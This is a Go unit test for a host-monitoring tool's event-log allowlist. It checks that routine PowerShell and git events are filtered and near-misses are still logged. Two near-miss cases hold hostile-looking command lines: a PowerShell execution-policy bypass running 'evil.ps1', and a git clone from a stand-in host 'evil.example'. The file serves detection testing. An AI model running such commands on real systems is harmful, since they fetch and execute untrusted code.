package allowlist

import (
	"testing"

	"sentinel/internal/event"
)

// filterJSONC mirrors the event_log_filter section shipped in
// config/allowlist.json (powershell eid=11 empty cmdline; git poller). Kept
// inline (not loaded from disk) so this unit test is self-contained.
const filterJSONC = `{
  "event_log_filter": [
    { "eid": 11, "image": "\\\\windowspowershell\\\\v1\\.0\\\\powershell\\.exe$", "cmdline": "^$" },
    { "image": "\\\\git\\\\.*\\\\git\\.exe$", "cmdline": "(check-ignore|rev-parse|--max-count|ls-files)" }
  ]
}`

// TestEventLogFilterMatchesAndNearMisses pins the 1:1 AND contract: each entry
// suppresses ONLY the exact boring event, and a near-miss (same image, a
// command line that fails the cmdline clause) is still logged.
func TestEventLogFilterMatchesAndNearMisses(t *testing.T) {
	a, err := Compile([]byte(filterJSONC))
	if err != nil {
		t.Fatalf("Compile: %v", err)
	}
	const ps = `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	const git = `C:\Program Files\Git\mingw64\bin\git.exe`
	const git2 = `C:\Program Files\Git\cmd\git.exe`

	cases := []struct {
		name string
		eid  int
		img  string
		cmd  string
		want bool
	}{
		// FILTERED (true): the exact boring patterns from sentinel.log.
		{"ps eid11 empty cmd", 11, ps, "", true},
		{"git check-ignore", 1, git, `git.exe check-ignore -v -z --stdin`, true},
		{"git rev-parse", 1, git2, `git.exe rev-parse --abbrev-ref HEAD`, true},
		{"git log --max-count", 1, git, `git.exe log --skip=0 --max-count=1 --pretty=format:%H`, true},

		// NEAR-MISSES (false): same image, command line fails the clause.
		// These are the events a blanket filter would wrongly drop; the AND
		// conjunction keeps them visible.
		{"ps eid11 WITH cmd (near-miss)", 11, ps, `-ep bypass -file evil.ps1`, false},
		{"git clone evil (near-miss)", 1, git2, `git.exe clone https://evil.example/x`, false},

		// UNRELATED events (false): never filtered.
		{"cmd.exe", 1, `C:\Windows\System32\cmd.exe`, `cmd /c dir`, false},
		{"cursor.exe eid3", 3, `C:\Users\j\AppData\Local\Programs\cursor\Cursor.exe`, "", false},

		// eid clause is exact: powershell + empty cmd but eid != 11 -> not filtered.
		{"ps empty cmd wrong eid", 1, ps, "", false},
	}
	for _, c := range cases {
		got := a.IsLogNoise(&event.Event{EID: c.eid, Image: c.img, CmdLine: c.cmd})
		if got != c.want {
			t.Errorf("%s: IsLogNoise=%v want %v", c.name, got, c.want)
		}
	}

	// Nil safety (the engine calls IsLogNoise through a nil-safe delegator, but
	// the method itself must also tolerate a nil receiver).
	if (*Allowlist)(nil).IsLogNoise(&event.Event{EID: 11, Image: ps, CmdLine: ""}) {
		t.Error("nil Allowlist must be safe and report no noise")
	}
}

// TestEventLogFilterCompileGuardrails: an entry that would suppress EVERY
// event's dump line is rejected at Compile (same fail-fast contract as a bad
// trusted_binaries regex). Omitting the section entirely is fine (no-op).
func TestEventLogFilterCompileGuardrails(t *testing.T) {
	if _, err := Compile([]byte(`{ "event_log_filter": [ {} ] }`)); err == nil {
		t.Error("expected error for an entry with no fields (would suppress everything)")
	}
	if _, err := Compile([]byte(`{ "event_log_filter": [ { "eid": 0 } ] }`)); err == nil {
		t.Error("expected error for eid=0-only entry (effectively all-wildcard)")
	}
	if _, err := Compile([]byte(`{ "event_log_filter": [ { "image": "[" } ] }`)); err == nil {
		t.Error("expected error for a bad image regex")
	}
	a, err := Compile([]byte(`{}`))
	if err != nil {
		t.Fatalf("Compile empty doc: %v", err)
	}
	if a.IsLogNoise(&event.Event{EID: 11, Image: `C:\x\powershell.exe`, CmdLine: ""}) {
		t.Error("with no event_log_filter section, nothing should be filtered")
	}
}
